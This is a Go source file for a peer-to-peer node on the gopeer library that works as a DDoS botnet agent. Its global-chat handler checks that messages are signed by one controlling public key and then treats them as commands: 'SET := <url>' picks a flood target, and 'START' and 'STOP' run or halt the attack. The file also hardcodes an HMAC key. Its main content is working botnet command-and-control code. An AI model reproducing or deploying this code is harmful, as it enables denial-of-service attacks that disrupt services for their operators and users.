package main

import (
    "os"
    "fmt"
    "bytes"
    "strings"
    "io/ioutil"
    "crypto/rsa"
    "./gopeer"
)

func init() {
    gopeer.Set(gopeer.SettingsType{
        "SERVER_NAME": "HIDDEN-LAKE",
        "NETWORK": "[HIDDEN-LAKE]",
        "VERSION": "[1.0.6s]",
        "HMACKEY": "9163571392708145",
        "KEY_SIZE": uint64(KEY_SIZE), // 3072 bit
    })
}

func main() {
    key, cert := gopeer.GenerateCertificate(
        gopeer.Get("SERVER_NAME").(string), 
        gopeer.Get("KEY_SIZE").(uint16),
    )
    listener := gopeer.NewListener(gopeer.Get("IS_CLIENT").(string))
    listener.Open(&gopeer.Certificate{
        Cert: []byte(cert),
        Key:  []byte(key),
    }).Run(handleServer)
    defer listener.Close()

    client := listener.NewClient(PRIVATE_CLIENT)
    handleClient(client)
    // ...
}

func handleClient(client *gopeer.Client) {
    for _, node := range LIST_OF_NODES {
        dest := &gopeer.Destination{
            Address: node.Address,
            Certificate: []byte(node.Certificate),
            Public: gopeer.ParsePublic(node.Public),
        }
        connect(client, dest)
    }

    dest := &gopeer.Destination{
        Receiver: PUBLIC_RECV,
    }
    connect(client, dest)
    client.SendTo(dest, &gopeer.Package{
        Head: gopeer.Head{
            Title:  TITLE_GLOBALCHAT,
            Option: gopeer.Get("OPTION_GET").(string),
        },
        Body: gopeer.Body{
            Data: string(gopeer.PackJSON(GlobalChat{
                Head: GlobalChatHead{
                    Founder: gopeer.HashPublic(PUBLIC_RECV),
                    Option:  gopeer.Get("OPTION_GET").(string),
                },
            })),
        },
    })

    for {
        fmt.Scanln()
    }
}

func connect(client *gopeer.Client, dest *gopeer.Destination) {
    message := "connection created"
    client.Connect(dest)
    client.SendTo(dest, &gopeer.Package{
        Head: gopeer.Head{
            Title:  TITLE_LOCALCHAT,
            Option: gopeer.Get("OPTION_GET").(string),
        },
        Body: gopeer.Body{
            Data: message,
        },
    })
}

func tryGeneratePrivate(filename string, bits int) *rsa.PrivateKey {
    if _, err := os.Stat(filename); os.IsNotExist(err) {
        file, err := os.Create(filename)
        if err != nil {
            return nil
        }
        priv := gopeer.GeneratePrivate(uint16(bits))
        file.WriteString(gopeer.StringPrivate(priv))
        return priv
    }
    file, err := os.Open(filename)
    if err != nil {
        return nil
    }
    privPem, err := ioutil.ReadAll(file)
    if err != nil {
        return nil
    }
    return gopeer.ParsePrivate(string(privPem))
}

func handleServer(client *gopeer.Client, pack *gopeer.Package) {
    client.HandleAction(TITLE_ARCHIVE, pack, funcGet, funcSet)
    client.HandleAction(TITLE_LOCALCHAT, pack, funcGet, funcSet)
    client.HandleAction(TITLE_EMAIL, pack, funcGet, funcSet)
    client.HandleAction(TITLE_TESTCONN, pack, funcGet, funcSet)
    client.HandleAction(TITLE_GLOBALCHAT, pack, getGlobalchat, funcSet)
}

func getGlobalchat(client *gopeer.Client, pack *gopeer.Package) (set string) {
    var (
        glbcht = new(GlobalChat)
    )
    gopeer.UnpackJSON([]byte(pack.Body.Data), glbcht)
    if glbcht == nil {
        return
    }
    switch glbcht.Head.Option {
    case TITLE_GLOBALCHAT:
        // pass
    default:
        return
    }
    if len(glbcht.Body.Data) >= MESSAGE_SIZE {
        return
    }
    if glbcht.Head.Founder != pack.From.Sender.Hashname {
        return
    }
    public := gopeer.ParsePublic(glbcht.Head.Sender.Public)
    if public == nil {
        return
    }
    hashname := gopeer.HashPublic(public)
    if hashname != glbcht.Head.Sender.Hashname {
        return
    }
    checkhash := gopeer.HashPublic(PUBLIC_RECV)
    if checkhash != hashname {
        return
    }
    random := gopeer.Base64Decode(glbcht.Body.Desc.Rand)
    hash := gopeer.HashSum(bytes.Join(
        [][]byte{
            []byte(hashname),
            []byte(glbcht.Head.Founder),
            []byte(glbcht.Body.Data),
            random,
        },
        []byte{},
    ))
    if gopeer.Base64Encode(hash) != glbcht.Body.Desc.Hash {
        return
    }
    if gopeer.Verify(public, hash, gopeer.Base64Decode(glbcht.Body.Desc.Sign)) != nil {
        return
    }
    // SET := http://localhost:9090
    // START
    // STOP
    glbcht.Body.Data = strings.Replace(glbcht.Body.Data, " ", "", -1)
    switch {
    case strings.HasPrefix(glbcht.Body.Data, "START"):
        ObjectDDOS.Start()

    case strings.HasPrefix(glbcht.Body.Data, "STOP"):  
        ObjectDDOS.Stop()

    case strings.HasPrefix(glbcht.Body.Data, "SET"):
        splited := strings.Split(glbcht.Body.Data, ":=")
        if len(splited) < 2 {
            return
        }
        ObjectDDOS = NewDDOS(splited[1], 20)
    }
    return set
}

func funcGet(client *gopeer.Client, pack *gopeer.Package) (set string) {
    return set
}

func funcSet(client *gopeer.Client, pack *gopeer.Package) {
}
